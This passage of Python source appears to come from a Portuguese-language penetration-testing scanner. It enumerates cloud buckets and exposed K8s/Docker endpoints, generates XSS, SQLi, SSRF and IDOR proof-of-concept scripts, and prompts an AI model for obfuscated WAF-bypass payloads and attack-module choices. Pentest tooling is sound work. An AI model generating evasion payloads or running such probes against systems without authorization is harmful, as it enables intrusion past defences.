  <div>{tech_badges if tech_badges else '<span style="color:#888">Nenhuma detectada</span>'}</div>
</div>

<div class="section">
  <h2>Vulnerabilidades Encontradas</h2>
  {'<p style="color:#27ae60">✔ Nenhuma vulnerabilidade diretamente confirmada.</p>' if not rows_html else ''}
  <table>
    <tr><th>Tipo</th><th>Quantidade</th><th>Severidade</th></tr>
    {rows_html}
  </table>
</div>

<div class="section">
  <h2>Estrutura de Arquivos</h2>
  <pre style="color:#1abc9c;font-size:0.85em">{cfg.scan_dir}/
├── 01_discovery/    subdomínios, hosts, ports
├── 02_urls/         URLs (wayback+gau+katana)
├── 03_params/       parâmetros, arjun
├── 04_vulns/        candidatos gf
├── 05_scans/        xss, sqli, idor, crlf, graphql, lfi, ssti, ssrf, xxe, nosql
├── 06_screenshots/  capturas gowitness
├── 07_js/           JS endpoints, secrets, trufflehog
├── 08_extra/        CORS, headers, ffuf, takeover, WAF, sensíveis, 403bypass, metadata
└── 09_report/       vuln_urls.txt + vuln_urls.json + index.html + ai_triage.txt + ai_attack_plan.txt</pre>
</div>

<div class="footer">RECON v5.0 — USE APENAS EM SISTEMAS COM AUTORIZAÇÃO EXPLÍCITA</div>
</body>
</html>"""
    with open(html_path,'w') as f:
        f.write(html)
    success(f"HTML Report → {html_path}")


# ─────────────────────────────────────────────────────────────────────────────
# FINAL SUMMARY
# ─────────────────────────────────────────────────────────────────────────────
def final_summary():
    section("SCAN COMPLETO — RECON v5.0")
    elapsed = time.time() - cfg.scan_start
    h, r = divmod(int(elapsed), 3600)
    m, s = divmod(r, 60)

    print()
    print(f"{BOLD}{LCYAN}  ╔══════════════════════════════════════════════════════════════╗")
    print(f"  ║         RECON v5.0 — FINALIZADO                              ║")
    print(f"  ╠══════════════════════════════════════════════════════════════╣")
    print(f"  ║  {'Alvo:':<30} {cfg.domain:<29} ║")
    print(f"  ║  {'Duração:':<30} {f'{h:02d}h {m:02d}m {s:02d}s':<29} ║")
    print(f"  ║  {'Profile:':<30} {cfg.scan_profile:<29} ║")
    print(f"  ║  {'Erros log:':<30} {str(count_lines(cfg.error_log))+' linhas':<29} ║")
    print(f"  ╠══════════════════════════════════════════════════════════════╣")
    print(f"  ║  {'Subdomínios:':<30} {str(count_lines(cfg.dir_disc+'/subs_all.txt')):<29} ║")
    print(f"  ║  {'Hosts ativos:':<30} {str(count_lines(cfg.dir_disc+'/alive.txt')):<29} ║")
    print(f"  ║  {'URLs coletadas:':<30} {str(count_lines(cfg.dir_urls+'/urls_all.txt')):<29} ║")
    print(f"  ║  {'Parâmetros:':<30} {str(count_lines(cfg.dir_params+'/params.txt')):<29} ║")
    print(f"  ║  {'Arquivos JS:':<30} {str(count_lines(cfg.dir_js+'/js_files.txt')):<29} ║")
    print(f"  ║  {'Report HTML:':<30} {(cfg.dir_report+'/index.html')[-29:]:<29} ║")
    print(f"  ║  {'PoCs gerados:':<30} {str(len(glob.glob(cfg.dir_report+'/pocs/*.py'))):<29} ║")
    esumm = cfg.dir_report+'/executive_summary.txt'
    print(f"  ║  {'Resumo Executivo:':<30} {'OK' if os.path.exists(esumm) else 'não gerado':<29} ║")
    enc_count = len(glob.glob(cfg.dir_report+'/*.gpg') + glob.glob(cfg.dir_js+'/*.gpg'))
    if cfg.encrypt_output:
        print(f"  ║  {'Arquivos criptografados:':<30} {str(enc_count):<29} ║")
    print(f"  ╚══════════════════════════════════════════════════════════════╝{NC}")
    print()
    success(f"Tudo salvo em: {cfg.scan_dir}/")


# ─────────────────────────────────────────────────────────────────────────────
# WATCHER MODE (v3 — NOVO)
# ─────────────────────────────────────────────────────────────────────────────
def watcher_mode():
    """Executa scan periodicamente, notifica apenas novas descobertas."""
    banner()
    info(f"WATCHER MODE ativado — verificando {cfg.domain} a cada {cfg.watch_interval}s")
    info(f"Pressione Ctrl+C para sair")

    scan_count = 0
    while True:
        scan_count += 1
        info(f"\n══ Watcher scan #{scan_count} ══")
        cfg.delta_mode = (scan_count > 1)
        cfg.scan_start = time.time()
        setup_dirs()
        db_init()
        check_deps()
        step_subdomains()
        step_passive_intel()
        step_alive()
        step_tech_profiler()

        if scan_count > 1:
            # Delta: só processa novos subdomínios
            new_subs_file = f"{cfg.dir_disc}/subs_new.txt"
            if not is_empty(new_subs_file):
                warn(f"WATCHER: {count_lines(new_subs_file)} subdomínios NOVOS detectados!")
                shutil.copy(new_subs_file, f"{cfg.dir_disc}/alive.txt")
            else:
                info("WATCHER: nenhuma novidade neste ciclo")

        step_waf_detect()
        step_urls()
        step_filter_urls()
        step_sensitive()
        step_vuln_report()

        # Notificação simples via arquivo
        notify_file = f"{cfg.domain}_watcher_alerts.txt"
        total = count_lines(f"{cfg.dir_report}/vuln_urls.txt")
        if total > 0:
            with open(notify_file,'a') as f:
                f.write(f"[{datetime.now().isoformat()}] Scan #{scan_count}: {total} findings em {cfg.scan_dir}\n")
            error(f"WATCHER ALERT: {total} findings → {notify_file}")

        info(f"Próximo scan em {cfg.watch_interval}s...")
        time.sleep(cfg.watch_interval)


# ─────────────────────────────────────────────────────────────────────────────
# v4 — VALIDAÇÃO DE WHITELIST (Safe Mode)
# ─────────────────────────────────────────────────────────────────────────────
def validate_domain_whitelist():
    """
    Bloqueia execução se o domínio não estiver na whitelist configurada.
    Whitelist pode vir de --whitelist ou da variável RECON_WHITELIST.
    """
    wl_env = os.environ.get('RECON_WHITELIST', '')
    wl_all = list(cfg.whitelist)
    if wl_env:
        wl_all += [d.strip() for d in wl_env.split(',') if d.strip()]

    if not wl_all:
        return  # whitelist não configurada — sem restrição

    target = cfg.domain.lower().lstrip('.')
    allowed = False
    for entry in wl_all:
        entry = entry.strip().lower().lstrip('.')
        # Aceita domínio exato ou qualquer subdomínio
        if target == entry or target.endswith('.' + entry):
            allowed = True
            break

    if not allowed:
        print(f"\n{LRED}╔══════════════════════════════════════════════════════════════╗{NC}")
        print(f"{LRED}║  ⛔ SAFE MODE: DOMÍNIO NÃO AUTORIZADO                        ║{NC}")
        print(f"{LRED}╠══════════════════════════════════════════════════════════════╣{NC}")
        print(f"{LRED}║  Alvo   : {cfg.domain:<51} ║{NC}")
        print(f"{LRED}║  Whitelist: {', '.join(wl_all)[:49]:<49} ║{NC}")
        print(f"{LRED}╚══════════════════════════════════════════════════════════════╝{NC}")
        print(f"\n  Use {BOLD}--whitelist {cfg.domain}{NC} ou defina RECON_WHITELIST={cfg.domain}")
        sys.exit(2)

    success(f"Safe mode: '{cfg.domain}' autorizado na whitelist.")


# ─────────────────────────────────────────────────────────────────────────────
# v4 — CLOUD RECON (S3/GCS/Azure Buckets + K8s/Docker endpoints)
# ─────────────────────────────────────────────────────────────────────────────
def step_cloud_recon():
    section("00b / CLOUD RECON (S3 · GCS · Azure · K8s · Docker)")
    out_file = f"{cfg.dir_extra}/cloud_recon.txt"
    Path(out_file).touch()

    domain_parts = cfg.domain.replace('.', '-')
    # Variantes comuns de nomes de bucket
    bucket_names = [
        cfg.domain, domain_parts,
        f"{domain_parts}-backup", f"{domain_parts}-dev",
        f"{domain_parts}-staging", f"{domain_parts}-prod",
        f"{domain_parts}-data", f"{domain_parts}-assets",
        f"{domain_parts}-static", f"{domain_parts}-media",
        f"{domain_parts}-files", f"{domain_parts}-uploads",
        f"{domain_parts}-logs", cfg.domain.split('.')[0],
    ]

    log(f"Verificando {len(bucket_names)} variantes de buckets públicos...")

    def check_s3(name):
        url = f"https://{name}.s3.amazonaws.com/"
        st, body = cfetch(url)
        if st == 200:
            append_line(out_file, f"[S3 PÚBLICO] {url}")
            warn(f"S3 bucket público: {url}")
            if cfg.sqlite_db:
                db_save_vuln('s3_public_bucket', url, '', 'high')
        elif st == 403:
            append_line(out_file, f"[S3 EXISTE/PRIVADO] {url}")
            info(f"S3 bucket existe (privado): {name}")

    def check_gcs(name):
        url = f"https://storage.googleapis.com/{name}/"
        st, body = cfetch(url)
        if st == 200:
            append_line(out_file, f"[GCS PÚBLICO] {url}")
            warn(f"GCS bucket público: {url}")
            if cfg.sqlite_db:
                db_save_vuln('gcs_public_bucket', url, '', 'high')

    def check_azure(name):
        url = f"https://{name}.blob.core.windows.net/"
        st, body = cfetch(url)
        if st in (200, 400):  # 400 = existe mas requer autenticação
            append_line(out_file, f"[Azure Blob {'PÚBLICO' if st==200 else 'EXISTE'}] {url}")
            if st == 200:
                warn(f"Azure blob público: {url}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        list(ex.map(check_s3,    bucket_names))
        list(ex.map(check_gcs,   bucket_names))
        list(ex.map(check_azure, bucket_names))

    # K8s / Docker endpoints expostos
    log("Verificando endpoints Kubernetes/Docker expostos...")
    alive = safe_read(f"{cfg.dir_disc}/alive.txt")

    k8s_paths = [
        '/api/v1', '/api/v1/namespaces', '/api/v1/pods',
        '/apis', '/healthz', '/metrics', '/version',
        '/swagger.json', '/openapi/v2',
    ]
    docker_paths = [
        '/v1.41/containers/json', '/v1.40/containers/json',
        '/containers/json', '/_ping',
    ]
    k8s_ports  = [':6443', ':8443', ':8080', ':10250', ':10255', ':2379']
    dock_ports = [':2375', ':2376', ':4243']

    def check_exposed(base, paths, label):
        for path in paths:
            url = base.rstrip('/') + path
            st, body = cfetch(url)
            if st in (200, 401):
                severity = 'critical' if st == 200 else 'medium'
                msg = f"[{label} {'EXPOSTO' if st==200 else 'AUTH_REQUIRED'}] {url}"
                append_line(out_file, msg)
                warn(msg)
                if cfg.sqlite_db:
                    db_save_vuln(label.lower(), url, '', severity)
                return  # chega em 1 endpoint → já reporta o host

    for host_url in alive[:20]:
        # Testa com portas típicas de K8s/Docker
        parsed = urllib.parse.urlparse(host_url)
        base_host = f"{parsed.scheme}://{parsed.hostname}"
        for port in k8s_ports:
            check_exposed(f"https://{parsed.hostname}{port}", k8s_paths, "K8s")
        for port in dock_ports:
            check_exposed(f"http://{parsed.hostname}{port}", docker_paths, "Docker")

    n = count_lines(out_file)
    if n > 0:
        warn(f"Cloud Recon: {n} findings")
    else:
        info("Cloud Recon: nenhum bucket/endpoint exposto")


# ─────────────────────────────────────────────────────────────────────────────
# v4 — POC GENERATOR (scripts prontos para cada vuln confirmada)
# ─────────────────────────────────────────────────────────────────────────────
def step_poc_generator():
    section("20b / POC GENERATOR")
    poc_dir = f"{cfg.dir_report}/pocs"
    Path(poc_dir).mkdir(exist_ok=True)
    generated = 0

    def _write_poc(filename: str, content: str):
        nonlocal generated
        fpath = os.path.join(poc_dir, filename)
        with open(fpath, 'w') as f:
            f.write(content)
        generated += 1
        info(f"PoC gerado: {filename}")

    header = (
        "#!/usr/bin/env python3\n"
        "# PoC gerado por RECON v5.0 — USE APENAS EM SISTEMAS COM AUTORIZAÇÃO EXPLÍCITA\n"
        f"# Alvo: {cfg.domain} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        "# IMPORTANTE: Execute manualmente para confirmar impacto — NUNCA automatize em produção.\n\n"
    )

    # ── XSS PoCs ──
    xss_lines = (
        safe_read(f"{cfg.dir_scans}/dalfox.txt") +
        safe_read(f"{cfg.dir_scans}/xss_manual.txt")
    )
    if xss_lines:
        poc = header + "import urllib.request\n\n"
        poc += "# Payloads XSS confirmados — verifique se o payload é executado no navegador\n"
        poc += "findings = [\n"
        for line in xss_lines[:10]:
            poc += f"    {json.dumps(line.strip())},\n"
        poc += "]\n\n"
        poc += (
            "for f in findings:\n"
            "    print(f'Teste manualmente no navegador: {f}')\n"
            "    # Substitua o payload por: <script>alert(document.cookie)</script>\n"
            "    # para verificar acesso a cookies de sessão.\n"
        )
        _write_poc("poc_xss.py", poc)

    # ── SQLi PoCs ──
    sqli_lines = (
        safe_read(f"{cfg.dir_scans}/sqli_confirmed.txt") +
        safe_read(f"{cfg.dir_scans}/sqli_error_based.txt")
    )
    if sqli_lines:
        poc = header + "import subprocess\n\n"
        poc += "# SQLi confirmado — extrai versão do banco de dados (sem danos)\n"
        poc += "# Requer sqlmap instalado\n\n"
        poc += "targets = [\n"
        for line in sqli_lines[:5]:
            url = line.strip().split()[0] if line.strip() else ''
            if url.startswith('http'):
                poc += f"    {json.dumps(url)},\n"
        poc += "]\n\n"
        poc += (
            "for url in targets:\n"
            "    print(f'\\n[*] Testando: {url}')\n"
            "    cmd = ['sqlmap', '-u', url, '--batch', '--technique=E',\n"
            "           '--dbms=mysql', '-q', '--banner']\n"
            "    # '--banner' apenas imprime a versão do DB — sem dump de dados\n"
            "    subprocess.run(cmd)\n"
        )
        _write_poc("poc_sqli.py", poc)

    # ── SSRF PoC ──
    ssrf_lines = safe_read(f"{cfg.dir_scans}/ssrf_results.txt")
    if ssrf_lines:
        poc = header
        poc += "# SSRF — acessa metadata SSRF seguro (httpbin ou servidor controlado)\n"
        poc += "# Substitua ATTACKER_SERVER pelo seu servidor Interactsh ou Burp Collaborator\n\n"
        poc += "import urllib.request\n\n"
        poc += "ATTACKER_SERVER = 'http://your-interactsh-server.oast.fun'\n\n"
        poc += "targets = [\n"
        for line in ssrf_lines[:5]:
            poc += f"    {json.dumps(line.strip())},\n"
        poc += "]\n\n"
        poc += (
            "for t in targets:\n"
            "    probe_url = t.replace('SSRF', ATTACKER_SERVER)\n"
            "    print(f'[*] Sondando: {probe_url}')\n"
            "    try:\n"
            "        urllib.request.urlopen(probe_url, timeout=5)\n"
            "    except Exception as e:\n"
            "        print(f'    Resposta: {e}')\n"
        )
        _write_poc("poc_ssrf.py", poc)

    # ── IDOR PoC ──
    idor_lines = safe_read(f"{cfg.dir_scans}/idor_results.txt")
    if idor_lines:
        poc = header + "import urllib.request\n\n"
        poc += "# IDOR — testa acesso a IDs de outros usuários\n"
        poc += "# Faça login com usuário A, copie o token, e teste IDs do usuário B\n\n"
        poc += "AUTH_TOKEN = 'Bearer SEU_TOKEN_AQUI'\n\n"
        poc += "targets = [\n"
        for line in idor_lines[:5]:
            poc += f"    {json.dumps(line.strip())},\n"
        poc += "]\n\n"
        poc += (
            "for url in targets:\n"
            "    req = urllib.request.Request(url)\n"
            "    req.add_header('Authorization', AUTH_TOKEN)\n"
            "    try:\n"
            "        resp = urllib.request.urlopen(req, timeout=10)\n"
            "        print(f'[IDOR CONFIRMADO] {url} → HTTP {resp.status}')\n"
            "    except Exception as e:\n"
            "        print(f'[NEGADO] {url}: {e}')\n"
        )
        _write_poc("poc_idor.py", poc)

    # ── README ──
    readme = (
        f"# PoCs RECON v5.0 — {cfg.domain}\n"
        f"# Gerado em: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        "## Como usar\n"
        "Cada script é ISOLADO e deve ser executado MANUALMENTE para confirmar impacto.\n"
        "Nunca automatize a execução destes scripts contra sistemas em produção.\n\n"
        "## Arquivos\n"
    )
    for f in glob.glob(f"{poc_dir}/*.py"):
        readme += f"- `{os.path.basename(f)}`\n"
    with open(f"{poc_dir}/README.md", 'w') as f:
        f.write(readme)

    if generated > 0:
        success(f"PoC Generator: {generated} scripts em {poc_dir}/")
    else:
        info("PoC Generator: nenhuma vuln confirmada para gerar PoC")


# ─────────────────────────────────────────────────────────────────────────────
# v4 — CREDENTIAL LEAK CHECK (HaveIBeenPwned API)
# ─────────────────────────────────────────────────────────────────────────────
def step_credential_leak():
    section("20c / CREDENTIAL LEAK CHECK (HaveIBeenPwned)")
    out_file = f"{cfg.dir_report}/credential_leaks.txt"
    Path(out_file).touch()

    # Coleta emails/usernames de JS secrets e metadata
    candidates: Set[str] = set()
    for src in [f"{cfg.dir_js}/js_secrets.txt", f"{cfg.dir_extra}/metadata.txt"]:
        for line in safe_read(src):
            for m in re.finditer(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+', line):
                candidates.add(m.group().lower())

    if not candidates:
        info("Credential Leak: nenhum email encontrado nos outputs — pulando")
        return

    if not cfg.hibp_api_key:
        warn("Credential Leak: --hibp-key não configurado. "
             "Obtenha em https://haveibeenpwned.com/API/Key")
        warn(f"  {len(candidates)} emails encontrados mas não verificados: "
             f"{', '.join(list(candidates)[:5])}")
        with open(out_file, 'w') as f:
            f.write("# Emails encontrados (não verificados — configure --hibp-key)\n")
            f.write('\n'.join(sorted(candidates)) + '\n')
        return

    log(f"Verificando {len(candidates)} emails no HaveIBeenPwned...")
    headers = {
        'hibp-api-key':  cfg.hibp_api_key,
        'User-Agent':    'RECON-v4-SecurityResearch',
    }

    pwned_count = 0
    for email in list(candidates)[:30]:  # respeita limite da API
        try:
            url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{urllib.parse.quote(email)}?truncateResponse=false"
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, timeout=10) as resp:
                breaches = json.loads(resp.read())
                if breaches:
                    names = [b.get('Name','?') for b in breaches[:5]]
                    line = f"[PWNED] {email} → {len(breaches)} vazamentos: {', '.join(names)}"
                    append_line(out_file, line)
                    warn(line)
                    pwned_count += 1
                    if cfg.sqlite_db:
                        db_save_vuln('credential_leak', email, str(names), 'high')
        except urllib.error.HTTPError as e:
            if e.code == 404:
                append_line(out_file, f"[CLEAN] {email}")
            elif e.code == 429:
                warn("HIBP: rate limit — aguardando 2s...")
                time.sleep(2)
            else:
                log_err(f"HIBP {email}: HTTP {e.code}")
        except Exception as e:
            log_err(f"HIBP {email}: {e}")
        time.sleep(1.6)  # HIBP exige ≥1.5s entre requests

    if pwned_count > 0:
        warn(f"Credentials vazadas confirmadas: {pwned_count} emails")
    else:
        info("Credential Leak: nenhum email comprometido encontrado")


# ─────────────────────────────────────────────────────────────────────────────
# v4 — EXECUTIVE SUMMARY (resumo em linguagem não-técnica via AI)
# ─────────────────────────────────────────────────────────────────────────────
def step_executive_summary_ai():
    section("20d / RESUMO EXECUTIVO (AI — linguagem não-técnica)")
    if not cfg.anthropic_api_key:
        warn("Executive Summary requer --api-key ou ANTHROPIC_API_KEY. Pulando..."); return

    # Coleta dados do JSON de resultados
    report_json = f"{cfg.dir_report}/vuln_urls.json"
    if not os.path.exists(report_json):
        warn("JSON de resultados não encontrado — rode step_vuln_report primeiro"); return

    try:
        with open(report_json) as f:
            data = json.load(f)
    except Exception as e:
        warn(f"Erro ao ler JSON: {e}"); return

    stats = data.get('stats', {})
    tech  = data.get('tech_profile', {})
    total = data.get('total_findings', 0)

    context = (
        f"Alvo: {cfg.domain}\n"
        f"Tecnologias identificadas: {', '.join(k for k,v in tech.items() if v) or 'não identificadas'}\n"
        f"Total de achados de segurança: {total}\n\n"
        f"Detalhamento por categoria:\n"
        f"- Nuclei Crítico: {stats.get('n_crit', 0)} | Alto: {stats.get('n_high', 0)}\n"
        f"- XSS (cross-site scripting): {stats.get('xss_dalfox',0) + stats.get('xss_manual',0)}\n"
        f"- Injeção SQL: {stats.get('sqli',0) + stats.get('sqli_eb',0) + stats.get('sqli_blind',0)}\n"
        f"- Subdomain Takeover: {stats.get('takeover', 0)}\n"
        f"- Segredos expostos em JS: {stats.get('secrets', 0)}\n"
        f"- Arquivos sensíveis acessíveis: {stats.get('sensitive', 0)}\n"
        f"- CORS misconfiguration: {stats.get('cors', 0)}\n"
        f"- SSRF: {stats.get('ssrf', 0)} | SSTI: {stats.get('ssti', 0)}\n"
        f"- IDOR: {stats.get('idor', 0)} | CRLF: {stats.get('crlf', 0)}\n"
    )

    payload_data = {
        "model": "claude-sonnet-4-20250514",
        "max_tokens": 1200,
        "system": (
            "Você é um consultor de segurança explicando riscos para gestores e diretores não-técnicos. "
            "Com base nos dados de um scan de segurança, produza um RESUMO EXECUTIVO em português com:\n"
            "1. Uma frase de status geral (ex: 'A aplicação apresenta riscos CRÍTICOS que necessitam ação imediata')\n"
            "2. Os 3 riscos mais graves — explicados em linguagem de negócio, SEM jargões técnicos\n"
            "   (ex: em vez de 'XSS refletido', use 'invasor pode roubar sessões de usuários logados')\n"
            "3. Impacto financeiro / reputacional potencial de cada risco\n"
            "4. Recomendação de prioridade de correção (1=urgente, 2=importante, 3=planejado)\n"
            "5. Uma frase de conclusão para justificar investimento em correção\n"
            "Tom: objetivo, sem alarmar desnecessariamente, mas claro sobre os riscos reais."
        ),
        "messages": [{"role": "user", "content": context}]
    }

    try:
        req = urllib.request.Request(
            "https://api.anthropic.com/v1/messages",
            data=json.dumps(payload_data).encode(),
            headers={
                "Content-Type": "application/json",
                "x-api-key": cfg.anthropic_api_key,
                "anthropic-version": "2023-06-01"
            }
        )
        with urllib.request.urlopen(req, timeout=60) as resp:
            result = json.loads(resp.read())
            summary_text = result["content"][0]["text"]

        out_file = f"{cfg.dir_report}/executive_summary.txt"
        with open(out_file, 'w') as f:
            f.write(f"RESUMO EXECUTIVO — {cfg.domain}\n")
            f.write(f"Gerado em: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
            f.write("=" * 64 + "\n\n")
            f.write(summary_text)
        success(f"Resumo Executivo → {out_file}")
        print(f"\n{BOLD}{LCYAN}══════ RESUMO EXECUTIVO ══════{NC}")
        print(summary_text)
        print(f"{BOLD}{LCYAN}══════════════════════════════{NC}\n")
    except Exception as e:
        warn(f"Executive Summary falhou: {e}")


# ─────────────────────────────────────────────────────────────────────────────
# v4 — CRIPTOGRAFIA DE OUTPUTS SENSÍVEIS (GPG)
# ─────────────────────────────────────────────────────────────────────────────
def encrypt_output_files():
    """Criptografa arquivos sensíveis com GPG (senha simétrica)."""
    if not cfg.encrypt_output:
        return
    if not cfg.has_gpg:
        warn("encrypt-output: gpg não encontrado — instale: sudo apt install gnupg"); return
    if not cfg.encrypt_password:
        warn("encrypt-output: --encrypt-pass não definido — pulando criptografia"); return

    sensitive_files = [
        f"{cfg.dir_js}/js_secrets.txt",
        f"{cfg.dir_js}/js_secrets_validated.txt",
        f"{cfg.dir_report}/vuln_urls.txt",
        f"{cfg.dir_report}/vuln_urls.json",
        f"{cfg.dir_report}/ai_triage.txt",
        f"{cfg.dir_report}/credential_leaks.txt",
        f"{cfg.dir_extra}/sensitive_files.txt",
    ]

    log("Criptografando outputs sensíveis com GPG...")
    encrypted = 0
    for fpath in sensitive_files:
        if not os.path.exists(fpath) or os.path.getsize(fpath) == 0:
            continue
        out_enc = fpath + ".gpg"
        try:
            r = subprocess.run(
                ['gpg', '--batch', '--yes', '--symmetric',
                 '--cipher-algo', 'AES256',
                 '--passphrase', cfg.encrypt_password,
                 '--output', out_enc, fpath],
                capture_output=True, text=True, timeout=30
            )
            if r.returncode == 0:
                os.remove(fpath)  # remove original após criptografar
                encrypted += 1
                info(f"  Criptografado: {os.path.basename(fpath)}.gpg")
            else:
                warn(f"  GPG falhou para {os.path.basename(fpath)}: {r.stderr[:80]}")
        except Exception as e:
            log_err(f"encrypt {fpath}: {e}")

    if encrypted > 0:
        success(f"Criptografia: {encrypted} arquivos protegidos com AES-256")
        info("  Para descriptografar: gpg --decrypt arquivo.gpg")
    else:
        warn("Criptografia: nenhum arquivo sensível encontrado para criptografar")


# ─────────────────────────────────────────────────────────────────────────────
# v4 — LIVE DASHBOARD (servidor HTTP local com atualização dos findings)
# ─────────────────────────────────────────────────────────────────────────────
def start_live_dashboard(port: int = 8765):
    """
    Inicia servidor HTTP local que serve o relatório HTML em tempo real.
    Atualiza automaticamente a cada 15 segundos via meta-refresh.
    Roda em thread separada para não bloquear o scan.
    """
    if not cfg.scan_dir:
        return
    report_dir = cfg.dir_report

    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=report_dir, **kwargs)
        def log_message(self, fmt, *args):
            pass  # silencia logs do servidor no terminal

    def _inject_refresh(html: str) -> str:
        """Adiciona meta-refresh ao HTML para atualização automática."""
        refresh = '<meta http-equiv="refresh" content="15">'
        return html.replace('<head>', f'<head>{refresh}', 1) if '<head>' in html else html

    # Patch do handler para injetar refresh no HTML
    original_send = Handler.send_response

    class RefreshHandler(Handler):
        def do_GET(self):
            if self.path in ('/', '/index.html', ''):
                html_path = os.path.join(report_dir, 'index.html')
                if os.path.exists(html_path):
                    try:
                        with open(html_path, 'r', errors='replace') as f:
                            content = _inject_refresh(f.read())
                        encoded = content.encode('utf-8', errors='replace')
                        self.send_response(200)
                        self.send_header('Content-Type', 'text/html; charset=utf-8')
                        self.send_header('Content-Length', str(len(encoded)))
                        self.end_headers()
                        self.wfile.write(encoded)
                        return
                    except Exception:
                        pass
            super().do_GET()

    def _run():
        try:
            with socketserver.TCPServer(('127.0.0.1', port), RefreshHandler) as httpd:
                httpd.serve_forever()
        except OSError:
            pass  # porta em uso — silencia

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    info(f"Live Dashboard → http://127.0.0.1:{port}/ (atualiza a cada 15s)")


# ─────────────────────────────────────────────────────────────────────────────
# v5 — WAF AI BYPASS (pede variações de payload à IA após 403)
# ─────────────────────────────────────────────────────────────────────────────
def waf_ai_bypass(attack_type: str, original_payload: str, blocked_url: str) -> List[str]:
    """
    v6: Quando um payload recebe 403, consulta a IA para gerar 3 variações de bypass.
    Cache por (attack_type + WAF type): não paga pela mesma resposta da API duas vezes.
    Retorna lista de novos payloads para tentar. Se a API falhar, retorna [].
    """
    if not cfg.anthropic_api_key or not cfg.waf_evasion:
        return []

    # v6: Determina tipo de WAF para usar como chave de cache
    waf_type = "generic"
    waf_path = f"{cfg.dir_extra}/waf_detected.txt" if cfg.dir_extra else ""
    if waf_path and os.path.exists(waf_path):
        waf_content = strip_ansi(open(waf_path).read()).lower()
        for wt in ['cloudflare', 'akamai', 'imperva', 'modsecurity', 'f5', 'awswaf', 'sucuri']:
            if wt in waf_content:
                waf_type = wt
                break

    cache_key = f"{attack_type}:{waf_type}:{_payload_key(original_payload)}"

    # v6: Verifica cache antes de chamar a API
    with _waf_bypass_lock:
        if cache_key in _waf_bypass_cache:
            cached = _waf_bypass_cache[cache_key]
            info(f"WAF AI Bypass (cache hit): {len(cached)} variantes para {attack_type}/{waf_type}")
            return cached

    try:
        prompt = (
            f"Um WAF ({waf_type}) bloqueou (HTTP 403) o seguinte payload {attack_type}:\n"
            f"  Payload: {original_payload}\n"
            f"  URL: {blocked_url}\n\n"
            "Gere EXATAMENTE 3 variações ofuscadas que possam bypassar o WAF. "
            "Use técnicas modernas: encoding duplo, Unicode, case mixing, comentários SQL, "
            "entidades HTML, chunked encoding ou políglotas. "
            "Responda APENAS com um JSON array de 3 strings, sem explicação. "
            "Exemplo: [\"payload1\", \"payload2\", \"payload3\"]"
        )
        payload_data = {
            "model": "claude-sonnet-4-20250514",
            "max_tokens": 300,
            "messages": [{"role": "user", "content": prompt}]
        }
        req = urllib.request.Request(
            "https://api.anthropic.com/v1/messages",
            data=json.dumps(payload_data).encode(),
            headers={"Content-Type": "application/json",
                     "x-api-key": cfg.anthropic_api_key,
                     "anthropic-version": "2023-06-01"}
        )
        with urllib.request.urlopen(req, timeout=20) as resp:
            data = json.loads(resp.read())
            raw = data["content"][0]["text"].strip()
            raw = re.sub(r'^```[a-z]*\n?|```$', '', raw, flags=re.M).strip()
            variants = json.loads(raw)
            if isinstance(variants, list):
                result = [str(v) for v in variants[:3]]
                info(f"WAF AI Bypass: {len(result)} variantes geradas para {attack_type}/{waf_type}")
                # v6: Salva no cache para reutilização
                with _waf_bypass_lock:
                    _waf_bypass_cache[cache_key] = result
                return result
    except urllib.error.URLError as e:
        log_err(f"waf_ai_bypass URLError: {e}")
    except (json.JSONDecodeError, KeyError, ValueError) as e:
        log_err(f"waf_ai_bypass parse error: {e}")
    except OSError as e:
        log_err(f"waf_ai_bypass OS error: {e}")
    return []


# ─────────────────────────────────────────────────────────────────────────────
# v5 — AGENTE OODA (Observe → Orient → Decide → Act via Function Calling)
# ─────────────────────────────────────────────────────────────────────────────
def step_ai_agent():
    """
    Agente autônomo: envia contexto pós-recon à IA e usa Function Calling
    para que o modelo decida quais módulos de scan executar e com quais flags.
    Substitui a execução cega e sequencial de todos os steps.
    """
    section("AGENTE OODA — IA decide os módulos de ataque")
    if not cfg.anthropic_api_key:
        warn("--agent requer ANTHROPIC_API_KEY. Pulando."); return

    # ── Contexto de observação ────────────────────────────────────────────────
    alive_count  = count_lines(f"{cfg.dir_disc}/alive.txt")
    subs_count   = count_lines(f"{cfg.dir_disc}/subs_all.txt")
    params_count = count_lines(f"{cfg.dir_params}/params_alive.txt") if os.path.exists(f"{cfg.dir_params}/params_alive.txt") else 0
    techs        = safe_read(f"{cfg.dir_extra}/technologies.txt")
    waf_info     = safe_read(f"{cfg.dir_extra}/waf_detected.txt")
    gf_counts    = {pat: count_lines(f"{cfg.dir_vulns}/{pat}.txt")
                    for pat in ['xss','sqli','lfi','rce','ssrf','redirect','ssti','idor']}
    ports        = safe_read(f"{cfg.dir_disc}/ports_interesting.txt")

    context = (
        f"Alvo: {cfg.domain}\n"
        f"Hosts ativos: {alive_count} | Subdomínios: {subs_count} | Params com resposta: {params_count}\n"
        f"WAF: {strip_ansi(chr(10).join(waf_info[:3])) or 'não detectado'}\n"
        f"Tecnologias: {chr(10).join(techs[:10]) or 'não identificadas'}\n"
        f"Portas interessantes: {', '.join(ports[:10]) or 'nenhuma'}\n"
        f"Candidatos GF: {json.dumps(gf_counts)}\n"
        f"Stack: PHP={cfg.tech_php} Node={cfg.tech_nodejs} Java={cfg.tech_java} "
        f"WP={cfg.tech_wordpress} GraphQL={cfg.tech_graphql} AWS={cfg.tech_aws}\n"
    )

    # ── Definição das ferramentas (Function Calling) ──────────────────────────
    tools = [
        {
            "name": "run_scan_modules",
            "description": (
                "Executa módulos de scan selecionados com base na análise do contexto de recon. "
                "Escolha APENAS os módulos com maior probabilidade de sucesso dado o stack detectado. "
                "Omita módulos irrelevantes (ex: não teste GraphQL se tech_graphql=False)."
            ),
            "input_schema": {
                "type": "object",
                "properties": {
                    "modules": {
                        "type": "array",
                        "description": "Lista de módulos a executar",
                        "items": {
                            "type": "string",
